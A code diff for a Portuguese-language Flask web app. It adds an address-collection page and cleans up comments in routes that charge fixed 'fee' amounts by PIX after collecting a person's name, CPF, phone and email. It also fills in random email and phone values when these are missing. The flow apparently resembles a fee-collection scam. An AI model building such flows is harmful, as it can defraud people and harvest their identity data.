@@ -252,13 +252,51 @@ def verificar_contato():
     dados_usuario['phone'] = ''.join(filter(str.isdigit, telefone))  # Remove formatação
     session['dados_usuario'] = dados_usuario
 
-    # Redireciona para a página de aviso de pagamento
-    return render_template('aviso_pagamento.html',
-                         dados={'name': dados_usuario['nome_real'],
-                               'email': email,
-                               'phone': dados_usuario['phone'],
-                               'cpf': dados_usuario['cpf']},
+    # Redireciona para a página de endereço
+    return redirect(url_for('verificar_endereco'))
+
+@app.route('/verificar_endereco', methods=['GET', 'POST'])
+def verificar_endereco():
+    dados_usuario = session.get('dados_usuario')
+    if not dados_usuario:
+        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        return redirect(url_for('index'))
+
+    if request.method == 'POST':
+        # Coleta os dados do formulário
+        endereco = {
+            'cep': request.form.get('cep'),
+            'logradouro': request.form.get('logradouro'),
+            'numero': request.form.get('numero'),
+            'complemento': request.form.get('complemento'),
+            'bairro': request.form.get('bairro'),
+            'cidade': request.form.get('cidade'),
+            'estado': request.form.get('estado')
+        }
+
+        # Valida se os campos obrigatórios foram preenchidos
+        campos_obrigatorios = ['cep', 'logradouro', 'numero', 'bairro', 'cidade', 'estado']
+        if not all(endereco.get(campo) for campo in campos_obrigatorios):
+            flash('Por favor, preencha todos os campos obrigatórios.')
+            return render_template('verificar_endereco.html', 
+                                current_year=datetime.now().year)
+
+        # Adiciona o endereço aos dados do usuário
+        dados_usuario['endereco'] = endereco
+        session['dados_usuario'] = dados_usuario
+
+        # Redireciona para a página de aviso de pagamento
+        return render_template('aviso_pagamento.html',
+                            dados={'name': dados_usuario['nome_real'],
+                                  'email': dados_usuario['email'],
+                                  'phone': dados_usuario['phone'],
+                                  'cpf': dados_usuario['cpf']},
+                            current_year=datetime.now().year)
+
+    # GET request - mostra o formulário
+    return render_template('verificar_endereco.html',
                          current_year=datetime.now().year)
+
 
 class For4PaymentsAPI:
     API_URL = "https://app.for4payments.com.br/api/v1"
@@ -379,7 +417,7 @@ def index():
 
 @app.route('/pagamento', methods=['GET', 'POST'])
 def pagamento():
-    user_data = session.get('dados_usuario') # Corrected session key
+    user_data = session.get('dados_usuario') 
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
@@ -387,11 +425,11 @@ def pagamento():
     try:
         payment_api = create_payment_api()
         payment_data = {
-            'name': user_data['nome_real'], # Corrected key
-            'email': user_data.get('email', generate_random_email()), # Handle missing email
+            'name': user_data['nome_real'], 
+            'email': user_data.get('email', generate_random_email()), 
             'cpf': user_data['cpf'],
-            'phone': user_data.get('phone', generate_random_phone()), # Handle missing phone
-            'amount': 247.10  # Soma das duas taxas: 128,40 + 118,70
+            'phone': user_data.get('phone', generate_random_phone()), 
+            'amount': 247.10  
         }
 
         pix_data = payment_api.create_pix_payment(payment_data)
@@ -407,7 +445,7 @@ def pagamento():
 
 @app.route('/pagamento_categoria', methods=['POST'])
 def pagamento_categoria():
-    user_data = session.get('dados_usuario') # Corrected session key
+    user_data = session.get('dados_usuario') 
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
@@ -420,11 +458,11 @@ def pagamento_categoria():
     try:
         payment_api = create_payment_api()
         payment_data = {
-            'name': user_data['nome_real'], # Corrected key
-            'email': user_data.get('email', generate_random_email()), # Handle missing email
+            'name': user_data['nome_real'], 
+            'email': user_data.get('email', generate_random_email()), 
             'cpf': user_data['cpf'],
-            'phone': user_data.get('phone', generate_random_phone()), # Handle missing phone
-            'amount': 114.10  # Valor fixo para taxa de categoria
+            'phone': user_data.get('phone', generate_random_phone()), 
+            'amount': 114.10  
         }
 
         pix_data = payment_api.create_pix_payment(payment_data)
@@ -451,7 +489,7 @@ def check_payment(payment_id):
 
 @app.route('/obrigado')
 def obrigado():
-    user_data = session.get('dados_usuario') #Corrected session key
+    user_data = session.get('dados_usuario') 
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
@@ -461,7 +499,7 @@ def obrigado():
 
 @app.route('/categoria/<tipo>')
 def categoria(tipo):
-    user_data = session.get('dados_usuario') # Corrected session key
+    user_data = session.get('dados_usuario') 
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
